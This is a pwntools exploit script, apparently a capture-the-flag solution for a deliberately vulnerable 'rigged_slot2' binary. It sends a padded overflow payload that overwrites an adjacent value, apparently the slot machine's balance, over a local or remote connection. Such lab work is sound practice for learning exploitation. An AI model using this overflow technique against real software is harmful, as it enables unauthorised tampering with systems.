#!/usr/bin/env python3

# ruff: noqa: F403, F405

from pwn import *

elf = context.binary = ELF("./challenge/rigged_slot2", checksec=False)
binary_path = elf.path


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
# source ~/.gdbinit-gef-bata24.py
"""

io = start()

payload = flat(b"A" * (0x20 - 0xC), 0x14684C + 1)
io.sendlineafter(b"Enter your name:", payload)
io.sendlineafter(b"per spin): ", b"1")

io.interactive()
